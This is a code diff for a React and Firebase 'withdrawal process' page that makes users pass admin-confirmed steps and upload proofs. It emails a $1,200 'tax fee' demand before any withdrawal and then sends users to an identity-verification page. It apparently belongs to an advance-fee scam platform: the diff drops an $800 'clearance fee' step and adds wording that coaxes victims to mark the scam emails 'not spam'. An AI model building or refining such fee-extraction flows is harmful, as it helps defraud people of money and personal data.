@@ -15,7 +15,14 @@ import {
 import { useTheme } from "@mui/material/styles";
 import CloudUploadIcon from "@mui/icons-material/CloudUpload";
 import HourglassEmptyIcon from "@mui/icons-material/HourglassEmpty";
-import { doc, getDoc, onSnapshot, setDoc, updateDoc, serverTimestamp } from "firebase/firestore";
+import {
+  doc,
+  getDoc,
+  onSnapshot,
+  setDoc,
+  updateDoc,
+  serverTimestamp,
+} from "firebase/firestore";
 import { auth, db } from "../firebase";
 import { onAuthStateChanged } from "firebase/auth";
 import { useNavigate } from "react-router-dom";
@@ -26,7 +33,7 @@ import {
   FINAL_CLEARANCE_FEE_EMAIL,
 } from "../emails/withdrawalEmails";
 
-const TOTAL_STEPS = 4;
+const TOTAL_STEPS = 3; // ✅ reduced from 4 → 3
 
 export default function WithdrawalProcess() {
   const theme = useTheme();
@@ -36,7 +43,7 @@ export default function WithdrawalProcess() {
 
   const [user, setUser] = useState(null);
   const [activeStep, setActiveStep] = useState(0);
-  const [adminConfirmed, setAdminConfirmed] = useState([false, false, false, false]);
+  const [adminConfirmed, setAdminConfirmed] = useState([false, false, false]);
   const [proofs, setProofs] = useState({});
   const [emailsSent, setEmailsSent] = useState({});
   const [loading, setLoading] = useState(true);
@@ -60,7 +67,7 @@ export default function WithdrawalProcess() {
       if (!snap.exists()) {
         await setDoc(refDoc, {
           step: 0,
-          adminConfirmed: [false, false, false, false],
+          adminConfirmed: [false, false, false],
           proofs: {},
           emailsSent: {},
           createdAt: serverTimestamp(),
@@ -84,7 +91,7 @@ export default function WithdrawalProcess() {
     containerRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [activeStep]);
 
-  // Base64 upload (unchanged)
+  // Base64 upload
   const fileToBase64 = (file) =>
     new Promise((resolve, reject) => {
       const reader = new FileReader();
@@ -104,80 +111,68 @@ export default function WithdrawalProcess() {
     });
   };
 
-  // 🔥 EMAIL HANDLER
+  // 🔥 EMAIL HANDLER (unchanged)
   const sendEmailOnce = async (key, template, amount) => {
-  try {
-    const ref = doc(db, "withdrawals", user.uid);
-    const snap = await getDoc(ref);
-    const data = snap.exists() ? snap.data() : {};
+    try {
+      const ref = doc(db, "withdrawals", user.uid);
+      const snap = await getDoc(ref);
+      const data = snap.exists() ? snap.data() : {};
 
-    // Prevent duplicate email
-    if (data?.emailsSent?.[key]) return;
+      if (data?.emailsSent?.[key]) return;
 
-    // Prepare EmailJS params
-    const params = template.getParams({
-      to_name: user.displayName || "Valued Customer",
-      to_email: user.email,
-      amount,
-    });
+      const params = template.getParams({
+        to_name: user.displayName || "Valued Customer",
+        to_email: user.email,
+        amount,
+      });
 
-    // Send email using EmailJS
-    await emailjs.send(
-      import.meta.env.VITE_EMAILJS_SERVICE_ID,
-      template.templateId,
-      params,
-      import.meta.env.VITE_EMAILJS_PUBLIC_KEY
-    );
+      await emailjs.send(
+        import.meta.env.VITE_EMAILJS_SERVICE_ID,
+        template.templateId,
+        params,
+        import.meta.env.VITE_EMAILJS_PUBLIC_KEY
+      );
 
-    // Mark email as sent
-    await updateDoc(ref, {
-      [`emailsSent.${key}`]: true,
-      updatedAt: serverTimestamp(),
-    });
-  } catch (err) {
-    console.error("Email send failed:", err);
-    throw new Error("Unable to send email. Please try again.");
-  }
-};
-
-
+      await updateDoc(ref, {
+        [`emailsSent.${key}`]: true,
+        updatedAt: serverTimestamp(),
+      });
+    } catch (err) {
+      console.error("Email send failed:", err);
+      throw new Error("Unable to send email. Please try again.");
+    }
+  };
 
   // Proceed
   const handleProceed = async () => {
-  if (activeStep === TOTAL_STEPS - 1) {
-    navigate("/verify-identity");
-    return;
-  }
-
-  if (!adminConfirmed[activeStep]) return;
-
-  try {
-    if (activeStep === 0) {
-      await sendEmailOnce("taxFee", TAX_FEE_EMAIL, "$1,200");
+    if (activeStep === TOTAL_STEPS - 1) {
+      navigate("/verify-identity");
+      return;
     }
 
-    if (activeStep === 1) {
-      await sendEmailOnce("finalClearance", FINAL_CLEARANCE_FEE_EMAIL, "$800");
-    }
+    if (!adminConfirmed[activeStep]) return;
 
-    // Advance to next step only after email succeeds
-    await updateDoc(doc(db, "withdrawals", user.uid), {
-      step: activeStep + 1,
-      updatedAt: serverTimestamp(),
-    });
-  } catch (err) {
-    alert(err.message); // shows "Unable to send email. Please try again."
-  }
-};
+    try {
+      if (activeStep === 0) {
+        await sendEmailOnce("taxFee", TAX_FEE_EMAIL, "$1,200");
+      }
+
+      await updateDoc(doc(db, "withdrawals", user.uid), {
+        step: activeStep + 1,
+        updatedAt: serverTimestamp(),
+      });
+    } catch (err) {
+      alert(err.message);
+    }
+  };
 
   const getMessage = () => {
     switch (activeStep) {
       case 0:
-        return "An email has been sent to you, follow the steps in the email to process your withdrawal.";
+        return "An email has been sent to you, follow the steps in the email to process your withdrawal. If you don’t see it within a few minutes, kindly check your Spam or Junk folder then click the 'Report not spam' button.";
       case 1:
-      case 2:
         return "Check your email to proceed with the next step.";
-      case 3:
+      case 2:
         return "Process Completed";
       default:
         return "";
@@ -240,7 +235,7 @@ export default function WithdrawalProcess() {
             alternativeLabel
             sx={{ mb: 4, "& .MuiStepLabel-label": { display: "none" } }}
           >
-            {[0, 1, 2, 3].map((i) => (
+            {[0, 1, 2].map((i) => (
               <Step key={i}>
                 <StepLabel />
               </Step>
@@ -249,14 +244,14 @@ export default function WithdrawalProcess() {
         )}
 
         <Typography
-          variant={activeStep === 3 ? "h5" : "body1"}
+          variant={activeStep === 2 ? "h5" : "body1"}
           align="center"
-          sx={{ mb: 2, fontWeight: activeStep === 3 ? 600 : 400 }}
+          sx={{ mb: 2, fontWeight: activeStep === 2 ? 600 : 400 }}
         >
           {getMessage()}
         </Typography>
 
-        {!adminConfirmed[activeStep] && activeStep !== 3 && (
+        {!adminConfirmed[activeStep] && activeStep !== 2 && (
           <Box display="flex" justifyContent="center" mb={3}>
             <Chip
               icon={<HourglassEmptyIcon />}
@@ -267,7 +262,7 @@ export default function WithdrawalProcess() {
           </Box>
         )}
 
-        {activeStep !== 3 && (
+        {activeStep !== 2 && (
           <Box
             sx={{
               border: "1px dashed",
@@ -305,7 +300,7 @@ export default function WithdrawalProcess() {
           </Box>
         )}
 
-        {activeStep === 3 && (
+        {activeStep === 2 && (
           <Typography align="center" variant="body2" color="text.secondary" sx={{ mb: 3 }}>
             Your withdrawal process has been successfully completed.
           </Typography>
